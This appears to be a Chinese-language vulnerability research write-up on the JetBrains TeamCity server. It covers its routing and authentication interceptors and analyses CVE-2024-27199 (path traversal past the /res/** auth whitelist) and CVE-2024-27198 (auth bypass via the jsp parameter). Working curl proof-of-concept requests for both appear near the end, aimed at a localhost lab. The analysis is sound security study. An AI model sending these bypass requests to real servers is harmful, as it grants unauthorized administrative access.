
Teamcity 是 JetBrain 推出的 CICD 平台，采用 Kotlin 开发。

## 环境搭建

可从官方 Docker 镜像中导出源码

```bash
gh clone https://github.com/JetBrains/teamcity-docker-samples
```

启动容器并拷贝容器内的文件

```
docker compose up -d
docker container cp c90512567f3d7eb98838f983639bd5367678373338faafd88d38ec2c42753cd4:/opt/teamcity ./
```

大致浏览一下 Teamcity 的目录结构和 Jar 包，采用的是 Tomcat + Spring MVC 搭建的，模板引擎使用的是 Freemarker。查看 `web.xml` 文件，可以看到 `Teamcity` 自己实现了一个 `DispatcherServlet` 类

```xml
<servlet>
    <servlet-name>buildServer</servlet-name>
    <servlet-class>jetbrains.buildServer.maintenance.TeamCityDispatcherServlet</servlet-class>
    <load-on-startup>2</load-on-startup>
    <async-supported>true</async-supported>
</servlet>
```

`jetbrains.buildServer.maintenance.TeamCityDispatcherServlet` 位于 `web-startup.jar` 中，查看一下反编译结果，可从常量 `MAIN_SERVER_SPRING_CONFIG` 中看到引用 `Spring` 的配置文件

- `/META-INF/shared-agent-server-spring.xml`
- `/META-INF/buildServerPluginsSupport.xml`
- `/META-INF/buildServerPermissions.xml`
- `/META-INF/buildServerSpring.xml`
- `/META-INF/buildServerSpring?*.xml`
- `/META-INF/buildServerCompatMode.xml`
- `/META-INF/server-issue-tracker-impl.xml`
- `/META-INF/build-server-declarative-extensibility.xml`
- `/WEB-INF/buildServerPluginsSupportWeb.xml`
- `/WEB-INF/buildServerSpringWeb.xml`
- `/WEB-INF/buildServerSpringWebDiag.xml`
- `/WEB-INF/build-server-plugin*.xml`
- `/META-INF/build-server-plugin*.xml`
- `/WEB-INF/buildServerConfigurator.xml`
- `/WEB-INF/buildServerSpringStatistics.xml`
- `/META-INF/*SpringContextLoader.xml`

`TeamCityDispatcherServlet` 中的 `init` 、`service`、`handleHealthCheckEndpoints` 方法在 `IDEA` 中无法正常反编译，通过 `JADX` 或 `procyon-decompiler` 可以看到反编译后的内容（不够准确但可作为参考）。`init` 方法会根据 `MAIN_SERVER_SPRING_CONFIG` 指定的配置文件初始化上下文对象 `this.myContext`。`service` 最终会调用 `processedByMainServlet` 处理请求。

```java
private boolean processedByMainServlet(ServletRequest var1, ServletResponse var2) throws ServletException, IOException {
	Servlet var3 = this.myMainServlet;

	try {
		if (var3 != null) {
			var3.service(var1, var2);
			return true;
		} else {
			return false;
		}
	} catch (ServletException var4) {
		throw var4;
	}
}
```

而 `this.myMainServlet` 的实际类型为 `jetbrains.buildServer.maintenance.WebDispatcherServlet`，它继承自 `DispatcherServlet`。

```java
public class WebDispatcherServlet extends DispatcherServlet {}
```

## 路由结构

通过 `web.xml` 可获取如下路由信息

```
/mnt/*
*.jspws

/maintenance/ajax/*
*.jsp
*.jspx
/update/*
/chart.png
/RPC2
/repository/*
/get/*
/builds/*
/httpAuth/*
/guestAuth/*
/presignedTokenAuth/*
/.well-known/acme-challenge/*
/res/*
/healthCheck/*
/favorite/projects
/favorite/builds
/favorite/agentPools
/project/*
/buildConfiguration/*
/build/*
/agents/*
/agent/*
/cloudImage/*
/cloudProfile/*
/agentPool/*
/test/*
/change/*
/changes
/queue
/learn
/pipelines/*
/investigations
/app/*
```

此外在 bean `urlMapping` 中还定义了额外的路由和 `Controller` 的关系。

```xml
<bean id="urlMapping" class="jetbrains.spring.web.UrlMapping" lazy-init="true">
<property name="omittingPrefixes">
  <list>
	<value>/httpAuth/</value>
	<value>/guestAuth/</value>
  </list>
</property>
<property name="urlMap">
  <map><!-- often used controllers -->
	<entry key="/" value-ref="overviewController"/>
	<entry key="/ajax.html" value-ref="ajaxController"/>
	<entry key="/subscriptions.html" value-ref="subscriptionsController"/>

	<entry key="/res/**" value-ref="pageResourceCompressor"/>

	<entry key="/overview.html" value-ref="overviewController"/>
	<entry key="/bsout.html" value-ref="bsOutController"/>
	<entry key="/project.html" value-ref="projectController"/>
	<entry key="/changes.html" value-ref="changesController"/>
	<entry key="/changeExpandedView.html" value-ref="changeExpandedViewController"/>
	<entry key="/RPC2" value-ref="xmlRpcController"/>
	<entry key="/app/agents/v1/**" value-ref="agentPollingProtocolController"/>
	<entry key="/app/agents/protocols" value-ref="agentProtocolsController"/>
	<entry key="/runtimeError.html" value-ref="runtimeErrorController"/>

	<entry key="/agents.html" value-ref="agentsController"/>
	<entry key="/viewLog.html" value-ref="viewLogController"/>
	<entry key="/viewQueued.html" value-ref="viewQueuedController"/>
	<entry key="/viewQueuedPersonal.html" value-ref="viewQueuedPersonalController"/>
	<entry key="/orphanBuild.html" value-ref="orphanBuildController"/>
	<entry key="/failedTestText.html" value-ref="failedTestTextController"/>
	<entry key="/change/testDetails.html" value-ref="testDetailsController"/>
	<entry key="/firstFailedInfo.html" value-ref="firstFailedInfoController"/>
	<entry key="/viewType.html" value-ref="buildTypeController"/>
	<entry key="/viewChain.html" value-ref="buildChainController"/>
	<entry key="/showCompatibleAgents.html" value-ref="showCompatibleAgentsController"/>
	<entry key="/willRunOnAgent.html" value-ref="willRunOnAgentController"/>
	<entry key="/buildResultsSummary.html" value-ref="buildResultsSummaryController"/>
	<entry key="/changesPopup.html" value-ref="changesPopupController"/>
	<entry key="/changesPopupTab.html" value-ref="changesPopupTabController"/>
	<entry key="/filesPopup.html" value-ref="filesPopupController"/>
	<entry key="/carpet.html" value-ref="carpetController"/>
	<entry key="/changesLink.html" value-ref="changesLinkController"/>
	<entry key="/limitedPendingChangesLink.html" value-ref="limitedPendingChangesLinkController"/>
	<entry key="/artifactsLink.html" value-ref="artifactsLinkController"/>
	<entry key="/tagsLink.html" value-ref="tagsLinkController"/>
	<entry key="/favoriteIcon.html" value-ref="favoriteIconController"/>

	<entry key="/update/buildServerPlugin.zip" value-ref="IdeaPluginUpdateLegacyController"/>
	<entry key="/chart.png" value-ref="chartController"/>
	<entry key="/exportchart.html" value-ref="chartExportController"/>
	<entry key="/downloadBuildLog.html" value-ref="downloadBuildLogController"/>
	<entry key="/buildLogSize.html" value-ref="buildLogSizeController"/>
	<entry key="/downloadRawMessageFile.html" value-ref="downloadRawMessageFileController"/>

	<entry key="/get/tests/**" value-ref="downloadTestsController"/>
	<entry key="/repository/download/**" value-ref="repositoryController"/>
	<entry key="/repository/archive/**" value-ref="repositoryArchiveController"/>
	<entry key="/repository/cache/**" value-ref="buildCacheController"/>
	<entry key="/get/file/**" value-ref="downloadController"/>

	<entry key="/showAgreement.html" value-ref="showLicenseAgreementController"/>
	<entry key="/login.html" value-ref="loginController"/>
	<entry key="/loginSubmit.html" value-ref="loginSubmitController"/>
	<entry key="/guestLogin.html" value-ref="guestLoginController"/>
	<entry key="/registerUser.html" value-ref="registerUserController"/>
	<entry key="/registerUserSubmit.html" value-ref="submitRegisterUserController"/>
	<entry key="/2fa.html" value-ref="twoFactorStepController"/>
	<entry key="/setupAdmin.html" value-ref="setupAdminController"/>
	<entry key="/setupAdminSubmit.html" value-ref="submitSetupAdminController"/>
	<entry key="/createAdminSubmit.html" value-ref="submitCreateAdminController"/>
	<entry key="/showBuildTupesPopup.html" value-ref="showBuildTypesPopupController"/>
	<entry key="/userAutocompletion.html" value-ref="userAutocompletionController"/>
	<entry key="/agents/agentsParametersReportResult.html" value-ref="agentsParametersReportController"/>
	<entry key="/agentDetails.html" value-ref="agentDetailsController"/>
	<entry key="/agentPools.html" value-ref="agentPoolController"/>
	<entry key="/agentStatus.html" value-ref="showAgentStatusController"/>
	<entry key="/promoteBuildDialog.html" value-ref="promoteBuildDialogController"/>
	<entry key="/viewModification.html" value-ref="vcsModificationController"/>
	<entry key="/uploadChanges.html" value-ref="loadBinaryChangesController"/>
	<entry key="/uploadChangesMultipart.html" value-ref="loadMultiprtBinaryChangesController"/>
	<entry key="/uploadDiffChanges.html" value-ref="loadDiffChangesController"/>
	<entry key="/investigations.html" value-ref="investigationsController"/>
	<entry key="/notificationRules.html" value-ref="editNotificationRulesController"/>
	<entry key="/notifierSettings.html" value-ref="editNotifierSettingsController"/>
	<entry key="/vcsSettings.html" value-ref="editVcsSettingsController"/>
	<entry key="/accessTokens.html" value-ref="editUserAccessTokensController"/>
	<entry key="/userSecuritySettings.html" value-ref="securitySettingsController"/>
	<entry key="/systemProblems.html" value-ref="systemProblemsController"/>
	<entry key="/visibleProjects.html" value-ref="visibleProjectsController"/>
	<entry key="/visibleBuildTypes.html" value-ref="visibleBuildTypesController"/>
	<entry key="/externalStatus.html" value-ref="externalStatusController"/>
	<entry key="/queue.html" value-ref="buildQueueController"/>
	<entry key="/buildGraph.html" value-ref="buildGraphController"/>
	<entry key="/notificationsInfoController.html" value-ref="notificationsInfoController"/>
	<entry key="/rolesDescription.html" value-ref="showRolesDescriptionController"/>
	<entry key="/viewDependentArtifactsPopup.html" value-ref="viewDependentArtifactsPopup"/>
	<entry key="/runCustomBuild.html" value-ref="runCustomBuildController"/>
	<entry key="/promotionGraph.html" value-ref="promotionGraphController"/>
	<entry key="/promoDetailsPopup.html" value-ref="promotionDetailsController"/>
	<entry key="/diffView.html" value-ref="diffViewController"/>
	<entry key="/comparisonFailureDiffView.html" value-ref="comparisonFailureDiffViewController"/>
	<entry key="/showJsp.html" value-ref="simpleJspController"/>
	<entry key="/buildChainsFilter.html" value-ref="chainsFilterController"/>
	<entry key="/buildChainStatusChart.html" value-ref="chainStatusChartController"/>
	<entry key="/vcsTreePopup.html" value-ref="vcsTreePopupController"/>
	<entry key="/projectData.html" value-ref="projectDataFetcherController"/>
	<entry key="/branchesPopup.html" value-ref="branchesPopupController"/>
	<entry key="/scheduleTriggerInspect.html" value-ref="scheduleTriggerInspectController"/>
	<entry key="/tz.html" value-ref="timezoneController"/>
	<entry key="/agentParametersAutocompletion.html" value-ref="agentParametersAutocompletionController"/>
	<entry key="/fileUpload.html" value-ref="fileUploadController"/>
	<entry key="/favoriteBuilds.html" value-ref="favoriteBuildsProxyController"/>
	<entry key="/builds.html" value-ref="allBuildsController"/>
	<entry key="/authenticationTest.html" value-ref="authTestController"/>

	<entry key="/testErrors.html" value-ref="runtimeErrorTestController"/>

	<!-- admin area -->

	<entry key="/admin/action.html" value-ref="adminActionsController"/>
	<entry key="/admin/authorityRolesPopup.html" value-ref="userRolesPopupController"/>
	<entry key="/admin/groupUsersPopup.html" value-ref="groupUsersPopupController"/>
	<entry key="/admin/settingsDiffView.html" value-ref="settingsDiffViewController"/>
	<entry key="/admin/parentGroupsPopup.html" value-ref="parentGroupsPopupController"/>
	<entry key="/admin/createUser.html" value-ref="adminCreateUserController"/>
	<entry key="/admin/vcsSettings.html" value-ref="editVcsSettingsController"/>
	<entry key="/admin/accessTokens.html" value-ref="editUserAccessTokensController"/>
	<entry key="/admin/createUserSubmit.html" value-ref="adminSubmitCreateUserController"/>
	<entry key="/admin/audit.html" value-ref="viewAuditLogController"/>
	<entry key="/admin/licenses.html" value-ref="agentLicenseManagerController"/>
	<entry key="/admin/perUsageLicenseDataController.html" value-ref="perUsageLicenseDataController"/>
	<entry key="/admin/createProject.html" value-ref="createProjectController"/>
	<entry key="/admin/createObjectFromUrl.html" value-ref="createObjectFromUrlController"/>
	<entry key="/admin/objectSetup.html" value-ref="objectSetupController"/>
	<entry key="/admin/repositoryControls.html" value-ref="repositoryControlsController"/>
	<entry key="/admin/editProject.html" value-ref="editProjectController"/>
	<entry key="/admin/projectVcsRoots.html" value-ref="projectVcsRootsController"/>
	<entry key="/admin/editVcsRoot.html" value-ref="editVcsRootsController"/>
	<entry key="/admin/duplicateVcsRoots.html" value-ref="duplicateVcsRootsController"/>
	<entry key="/admin/checkoutRulesSetup.html" value-ref="checkoutRulesController"/>
	<entry key="/admin/createBuildType.html" value-ref="createBuildTypeController"/>
	<entry key="/admin/createTemplate.html" value-ref="createTemplateController"/>
	<entry key="/admin/showTemplateParams.html" value-ref="showTemplateParametersController"/>
	<entry key="/admin/editBuildTypeVcsRoots.html" value-ref="editBuildTypeVcsRootsController"/>
	<entry key="/admin/attachBuildTypeVcsRoots.html" value-ref="attachBuildTypeVcsRootsController"/>
	<entry key="/admin/editBuild.html" value-ref="editBuildController"/>
	<entry key="/admin/editRunType.html" value-ref="editRunTypeController"/>
	<entry key="/admin/editBuildRunners.html" value-ref="editBuildRunnersController"/>
	<entry key="/admin/editBuildFeatures.html" value-ref="editBuildFeaturesController"/>
	<entry key="/admin/editBuildFeaturesList.html" value-ref="editBuildFeaturesListController"/>
	<entry key="/admin/editBuildParams.html" value-ref="editBuildParametersController"/>
	<entry key="/admin/editRequirements.html" value-ref="editRequirementsController"/>
	<entry key="/admin/buildTypeSuggestions.html" value-ref="buildTypeSuggestionsController"/>
	<entry key="/admin/parameterAutocompletion.html" value-ref="parameterAutocompletionController"/>
	<entry key="/admin/editTriggers.html" value-ref="editBuildTriggersController"/>
	<entry key="/admin/editBuildFailureConditions.html" value-ref="editBuildFailureConditionsController"/>
	<entry key="/admin/showTriggerParams.html" value-ref="showTriggerParametersController"/>
	<entry key="/admin/showFeatureParams.html" value-ref="showBuildFeatureParametersController"/>
	<entry key="/admin/triggers/editBuildDependencyTrigger.html" value-ref="editBuildDependencyTriggerController"/>
	<entry key="/admin/triggers/schedulingTriggerBuildDependency.html" value-ref="schedulingTriggerBuildDependencyController"/>
	<entry key="/admin/triggers/vcsCheckInterval.html" value-ref="vcsTriggerCheckIntervalController"/>
	<entry key="/admin/triggers/branchSupports.html" value-ref="triggerBranchSupportController"/>
	<entry key="/admin/jdkChooser.html" value-ref="jdkChooserController"/>
	<entry key="/admin/discoverRunners.html" value-ref="discoverRunnersController"/>
	<entry key="/admin/cleanupSettings.html" value-ref="cleanupSettingsPage"/>

	<entry key="/admin/editDependencies.html" value-ref="editArtifactDependenciesController"/>
	<entry key="/admin/dependenciesTable.html" value-ref="artifactDependenciesTableController"/>
	<entry key="/admin/cleanupPolicies.html" value-ref="cleanupPoliciesController"/>
	<entry key="/admin/diskUsage/diskUsage.html" value-ref="diskUsageController"/>
	<entry key="/admin/buildTime/buildTime.html" value-ref="buildTimeController"/>
	<entry key="/admin/diskUsage/diskUsageBuildsStats.html" value-ref="diskUsageBuildsPopupController"/>
	<entry key="/admin/backupPage.html" value-ref="backupController"/>
	<entry key="/admin/projectsImport.html" value-ref="projectsImportController"/>
	<entry key="/admin/projectsImportUpload.html" value-ref="projectsImportUploadArchiveController"/>
	<entry key="/admin/runnerParams.html" value-ref="showRunParametersController"/>
	<entry key="/admin/copyBuildType.html" value-ref="copyBuildTypeController"/>
	<entry key="/admin/copyTemplate.html" value-ref="copyTemplateController"/>
	<entry key="/admin/copyBuildStep.html" value-ref="copyBuildStepController"/>
	<entry key="/admin/moveBuildType.html" value-ref="moveBuildTypeController"/>
	<entry key="/admin/moveTemplate.html" value-ref="moveTemplateController"/>
	<entry key="/admin/copyProject.html" value-ref="copyProjectController"/>
	<entry key="/admin/moveProject.html" value-ref="moveProjectController"/>
	<entry key="/admin/pauseProject.html" value-ref="pauseProjectController"/>
	<entry key="/admin/moveVcsRoot.html" value-ref="moveVcsRootController"/>
	<entry key="/admin/serverConfigGeneral.html" value-ref="serverConfigGeneralController"/>
	<entry key="/admin/includedJdkTab.html" value-ref="agentDistributionSettings"/>
	<entry key="/admin/iprReparse.html" value-ref="iprReparseController"/>
	<entry key="/admin/attachToGroups.html" value-ref="attachToGroupsController"/>
	<entry key="/admin/attachUsersToGroup.html" value-ref="attachUsersToGroupController"/>
	<entry key="/admin/editGroup.html" value-ref="editGroupController"/>
	<entry key="/admin/buildTypeTemplatesPopup.html" value-ref="buildTypeTemplatesPopupController"/>
	<entry key="/admin/sskKeyChooser.html" value-ref="sshKeyChooser"/>
	<entry key="/admin/versionedSettings.html" value-ref="versionedSettingsController"/>
	<entry key="/admin/versionedSettingsActions.html" value-ref="versionedSettingsActionsController"/>
	<entry key="/admin/testMode.html" value-ref="testServerModeController"/>
	<entry key="/presignedTokenAuth/**" value-ref="presignedLinksController"/>
	<entry key="/admin/httpsToggle.html" value-ref="httpsToggleController"/>
	<entry key="/app/https/settings/**" value-ref="httpsCertificateSettingsController"/>
	<entry key="/.well-known/acme-challenge/**" value-ref="http01ChallengeController"/>

	<entry key="/app/buildLog/**" value-ref="remoteBuildLogController"/>

	<entry key="/404.html" value-ref="pageNotFoundController"/>
	<entry key="/400.html" value-ref="badRequestController"/>

  </map>
</property>

<property name="mappings">
  <props> <!-- controllers requiring lazy initialization -->
	<prop key="/action.html">actionController</prop>
  </props>
</property>
</bean>
```

## 认证和鉴权

查看配置文件 `buildServerSpringWeb.xml`，声明了如下拦截器

```xml
<mvc:interceptors>
	<ref bean="externalLoadBalancerInterceptor"/>
	<ref bean="agentsLoadBalancer"/>
	<ref bean="calledOnceInterceptors"/>
	<ref bean="pageExtensionInterceptor"/>
</mvc:interceptors>
```

其中 `calledOnceInterceptors` 拦截器的实现类为 `jetbrains.buildServer.controllers.interceptors.RequestInterceptors`，其内部还包含如下拦截器

```xml
<bean id="calledOnceInterceptors" class="jetbrains.buildServer.controllers.interceptors.RequestInterceptors">
<constructor-arg index="0">
  <list>
	<ref bean="mainServerInterceptor"/>
	<ref bean="registrationInvitations"/>
	<ref bean="projectIdConverterInterceptor"/>
	<ref bean="authorizedUserInterceptor"/>
	<ref bean="twoFactorAuthenticationInterceptor"/>
	<ref bean="domainIsolationProtectionInterceptor"/>
	<ref bean="firstLoginInterceptor"/>
	<ref bean="pluginUIContextProvider"/>
	<ref bean="callableInterceptorRegistrar"/>
  </list>
</constructor-arg>
</bean>
```

`authorizedUserInterceptor` 负责授权检查，实现类为 `jetbrains.buildServer.controllers.interceptors.AuthorizationInterceptorImpl`，

```java
@PerPluginRegistry
public class AuthorizationInterceptorImpl extends HandlerInterceptorAdapter implements AuthorizationInterceptor {
    private final WebLoginModelEx myLoginModel;
    private final Map<String, Collection<RequestPermissionsChecker>> myPermissionsCheckers = new HashMap();
    private final HttpAuthenticationManager myAuthManager;
    private final SetupAdminController mySetupAdminController;
    private final SecurityContextEx mySecurityContext;
    private final CSRFFilter myCsrfFilter;
    private final AuthorizationPaths myAuthorizationPaths;
    @NotNull
    private final UsersLoadBalancer myUsersLoadBalancer;
}
```

该拦截器中有一个字段 `myAuthorizationPaths`，由配置文件中的 `authorizationPaths` 进行配置

```xml
<bean id="authorizationPaths" class="jetbrains.buildServer.controllers.interceptors.AuthorizationPaths">
	<property name="pathsNotRequiringAuth">
	  <list>
		<value>/login.html</value>
		<value>/loginExtensions.html</value>
		<value>/loginIcons.html</value>
		<value>/loginSubmit.html</value>
		<value>/registerUser.html</value>
		<value>/registerUserSubmit.html</value>
		<value>/setupAdmin.html</value>
		<value>/setupAdminSubmit.html</value>
		<value>/createAdminSubmit.html</value>
		<value>/externalStatus.html</value>
		<value>/showAgreement.html</value>
		<value>/update/buildServerPlugin.zip</value>
		<value>/runtimeError.html</value>
		<value>/testErrors.html</value>
		<value>/res/**</value>
		<value>/.well-known/acme-challenge/**</value>
	  </list>
	</property>
	<property name="nonMemorizablePaths">
	  <list>
		<value>/ajax.html</value>
		<value>/app/subscriptions/**</value>
		<value>/app/rest/**</value>
		<value>/action.html</value>
		<value>/subscriptions.html</value>
		<value>/changesPopup.html</value>
		<value>/changesPopupTab.html</value>
		<value>/filesPopup.html</value>
		<value>/externalStatus.html</value>
		<value>/visibleProjects.html</value>
		<value>/visibleBuildTypes.html</value>
		<value>/showCompatibleAgents.html</value>
		<value>/admin/action.html</value>
		<value>/buildGraph.html</value>
		<value>/showAgreement.html</value>
		<value>/queuedBuilds.html</value>
		<value>/viewDependentArtifactsPopup.html</value>
		<value>/runBuild.html</value>
		<value>/promotionGraph.html</value>
		<value>/promoDetailsPopup.html</value>
		<value>/tz.html</value>
		<value>/authenticationTest.html</value>
		<value>/win32/**</value>
		<value>/js/ring/**</value>
		<value>/2fa.html</value>
	
		<!--The next path are here only for backwars compatibility.
		See jetbrains.buildServer.controllers.obsolete.EventTrackerController-->
		<value>/eventTracker.html</value>
		<value>/serverStatistics.html</value>
	  </list>
	</property>
</bean>
```

## 历史漏洞

### CVE-2024-27199

> 漏洞通告 https://blog.jetbrains.com/teamcity/2024/03/additional-critical-security-issues-affecting-teamcity-on-premises-cve-2024-27198-and-cve-2024-27199-update-to-2023-11-4-now

影响版本

- Teamcity < 2023.11.4

目录遍历引起的未授权访问漏洞，利用方式如下

```bash
curl -ik --path-as-is http://localhost:8112/res/../admin/diagnostic.jsp
```

正常访问 `/admin/diagnostic.jsp` 是需要授权的

```bash
curl -ik --path-as-is http://localhost:8112/admin/diagnostic.jsp
HTTP/1.1 401
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
WWW-Authenticate: Bearer realm="TeamCity"
Cache-Control: no-store
Content-Type: text/plain;charset=UTF-8
Transfer-Encoding: chunked
Date: Tue, 12 Mar 2024 13:54:28 GMT

Authentication required
To login manually go to "/login.html" page
```

先来了解一下 `Teamcity` 的鉴权机制，通过配置文件知道，鉴权位于拦截器 `jetbrains.buildServer.controllers.interceptors.AuthorizationInterceptorImpl` 中，其中 `pathsNotRequiringAuth` 声明了无需认证的路径，注意其中的两个路径

- `/res/**`
- `/.well-known/acme-challenge/**`

再回过头看 `AuthorizationInterceptorImpl` 是如何对路径进行判断是否需要认证的，

```java
public boolean preHandle(@NotNull final HttpServletRequest var1, @NotNull final HttpServletResponse var2, Object var3) throws Exception {
	return (Boolean)NamedThreadFactory.executeWithNewThreadName("Handling authentication", new Callable<Boolean>() {
		public Boolean call() throws Exception {
			String var1x = null;

			try {
				// ...
				String var4 = WebUtil.getPathWithoutContext(var1);
				if (!AuthorizationInterceptorImpl.this.myAuthorizationPaths.isAuthenticationRequired(var4)) {
					return true;
				}
```

这里 `WebUtil.getPathWithoutContext(var1)` 内部调用的是 `request.getRequestURI()`，即原始 `URI`，**没有经过归一化处理**，例如在这里得到的是 `/res/../admin/diagnostic.jsp`。而匹配的核心逻辑在 `!AuthorizationInterceptorImpl.this.myAuthorizationPaths.isAuthenticationRequired(var4)` ，其中 `myPathsNotRequiringAuthentication` 的类型为 `jetbrains.buildServer.controllers.interceptors.PathSet`

```java
// jetbrains.buildServer.controllers.interceptors.AuthorizationPaths
public boolean isAuthenticationRequired(String var1) {
	return !this.myPathsNotRequiringAuthentication.matches(var1);
}
 
// jetbrains.buildServer.controllers.interceptors.PathSet
public boolean matches(@NotNull String var1) {
	if (this.myExactPaths.contains(var1)) {
		return true;
	} else {
		AntPathMatcher var2 = new AntPathMatcher();
		Iterator var3 = this.myMatchingPaths.iterator();

		String var4;
		do {
			if (!var3.hasNext()) {
				return false;
			}

			var4 = (String)var3.next();
		} while(!var2.match(var4, var1));

		return true;
	}
}
```

其中 `myExactPaths` 字段中存储的是未使用通配符的路由，例如 `/login.html`，`myMatchingPaths` 字段中存储的是使用了通配符的路由，例如 `/res/**`。而这里的 `AntPathMatcher`，就是 `Spring` 框架中的提供的 `org.springframework.util.AntPathMatcher`。它的匹配逻辑就不多赘述了。总而言之一句话，`/res/../admin/diagnostic.jsp` 和 `/res/**` 是匹配的，从而认为该路径无需认证从而进入后续逻辑。

在实际分析的时候发现访问路由 `/res/../admin/diagnostic.jsp` 在内部会使得请求多次经过 `DispatcherServlet`（`Dispatch` 的目标从 `/res/../admin/diagnostic.jsp-> /admin/diagnostic.jsp-> /admin/nodeDiagnostic.html-> /admin/nodeDiagnostic.jsp`），从而触发多次拦截器的调用，那么为什么后续的被转发打请求没有触发认证？

在 `jetbrains.buildServer.controllers.interceptors.RequestInterceptors` 的 `preHandle` 方法中会现检查当前 `HttpServletRequest` 对象的属性 `__tc_requestStack`，该属性的意思应该是记录请求转发深度，但请求对象被第二次转发经过 `DispatcherServlet` 时 `Stack` 的深度超过了 `1`，`(var4.size() == 1) = false` 则跳过了拦截器，所以不会触发认证逻辑。

```java
public final boolean preHandle(HttpServletRequest var1, HttpServletResponse var2, Object var3) throws Exception {
	try {
		if (!this.requestPreHandlingAllowed(var1)) {
			return true;
		}
	} catch (Exception var10) {
		throw var10;
	}

	Stack var4 = this.requestIn(var1);

	label62: {
		try {
			if (var4.size() >= 70 && var1.getAttribute("__tc_requestStack_overflow") == null) {
				break label62;
			}
		} catch (Exception var9) {
			throw var9;
		}

		if (var4.size() == 1) {
			Iterator var5 = this.myInterceptors.iterator();

			while(var5.hasNext()) {
				HandlerInterceptor var6 = (HandlerInterceptor)var5.next();

				try {
					if (!var6.preHandle(var1, var2, var3)) {
						return false;
					}
				} catch (Exception var8) {
					throw var8;
				}
			}
		}

		return true;
	}
	// ...
}
@NotNull
private Stack requestIn(HttpServletRequest var1) {
	Stack var2 = this.getRequestStack(var1);
	var2.add(new Object());
	return var2;
}

private Stack getRequestStack(HttpServletRequest var1) {
	Stack var2 = (Stack)var1.getAttribute("__tc_requestStack");
	if (var2 == null) {
		var2 = new Stack();
		var1.setAttribute("__tc_requestStack", var2);
	}

	return var2;
}
```

### CVE-2024-27198

影响版本

- Teamcity < 2023.11.4

也是个未授权访问漏洞，该漏洞位于 `jetbrains.buildServer.controllers.BaseController` 中，在它的 handleRequestInternal 方法中若 modelAndView 对象的不是重定向，则会调用 `updateViewIfRequestHasJspParameter` 更新 `modelAndView` 对象

```java
public final ModelAndView handleRequestInternal(HttpServletRequest request, HttpServletResponse response) throws Exception {
	try {
		ModelAndView modelAndView = this.doHandle(request, response);
		if (modelAndView != null) {
			if (modelAndView.getView() instanceof RedirectView) {
				modelAndView.getModel().clear();
			} else {
				this.updateViewIfRequestHasJspParameter(request, modelAndView);
			}
		}

		return modelAndView;
	} catch (AccessDeniedException var8) {
```

`updateViewIfRequestHasJspParameter` 的实现如下，可以看到能够通过 `jsp` 参数修改 `modelAndView` 的 `viewName`

```java
private void updateViewIfRequestHasJspParameter(@NotNull HttpServletRequest request, @NotNull ModelAndView modelAndView) {
	boolean isControllerRequestWithViewName = modelAndView.getViewName() != null && !request.getServletPath().endsWith(".jsp");
	String jspFromRequest = this.getJspFromRequest(request);
	if (isControllerRequestWithViewName && StringUtil.isNotEmpty(jspFromRequest) && !modelAndView.getViewName().equals(jspFromRequest)) {
		// 通过 jsp 参数修改 modelAndView 的 viewName
		modelAndView.setViewName(jspFromRequest);
	}

}

@Nullable
protected String getJspFromRequest(@NotNull HttpServletRequest request) {
	String jspFromRequest = request.getParameter("jsp");
	return jspFromRequest == null || jspFromRequest.endsWith(".jsp") && !jspFromRequest.contains("admin/") ? jspFromRequest : null;
}
```

这里对 `jsp` 参数的内容有一定限制，需要以 `.jsp` 结尾，且不能包含 `admin/`。想利用该漏洞，需要先让请求到达 `BaseController`，再构造 `jsp` 参数，让请求转发至目标路由。由于 `BaseController` 是其它 `Controller` 的父类，随意找一个无需授权的 `Controller` 它的，例如 `loginController`、`PageNotFoundController` 等。下一步就是构造 `jsp` 参数，由于它必须以 `.jsp` 结尾，可用 `;` 将路由和 `.jsp` 分开。最终 `Poc` 如下

```bash
curl -ik http://localhost:8112/login.html?jsp=/app/rest/server;.jsp
```

